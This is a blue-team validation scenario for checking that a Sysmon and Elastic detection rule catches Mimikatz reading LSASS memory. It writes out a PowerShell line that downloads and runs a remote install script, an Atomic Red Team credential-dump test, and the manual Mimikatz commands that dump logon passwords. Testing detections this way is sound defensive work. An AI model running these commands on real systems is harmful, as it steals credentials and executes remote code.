# Scenario 01: Credential Dumping via Mimikatz

**Type**: Blue Team Validation  
**Technique**: T1003.001 — OS Credential Dumping: LSASS Memory  
**Expected Detection**: `credential_access_mimikatz_lsass`  
**Author**: Chandra Sekhar Chakraborty

---

## Objective

Validate that the Sysmon Event 10 + Elastic rule correctly detects Mimikatz accessing LSASS memory.

## Prerequisites

- Windows endpoint with Sysmon + Elastic Agent deployed
- Mimikatz binary on target (or use Atomic Red Team)
- Elastic SIEM detection rule enabled

## Execution Steps

### Option A: Atomic Red Team

```powershell
# Install Atomic Red Team (once)
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics

# Run Mimikatz LSASS dump test
Invoke-AtomicTest T1003.001 -TestGuids "d3d58bd1-14d4-4d9f-a9d4-9e8e2d5e5e3a"
```

### Option B: Manual Mimikatz

```
mimikatz.exe
  privilege::debug
  sekurlsa::logonpasswords
  exit
```

## Expected Sysmon Event

```xml
EventID: 10
SourceImage: C:\Tools\mimikatz.exe
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1410
CallTrace: ntdll.dll+...
```

## Validation

1. In Kibana → Security → Detections: look for rule **Mimikatz LSASS Memory Access**
2. Verify alert fields: `TargetImage = lsass.exe`, `GrantedAccess = 0x1410`
3. Confirm `SourceImage` is NOT in the exception list

## Cleanup

```powershell
# Remove Mimikatz binary
Remove-Item C:\Tools\mimikatz.exe -Force
# Invoke-AtomicTest T1003.001 -Cleanup
```
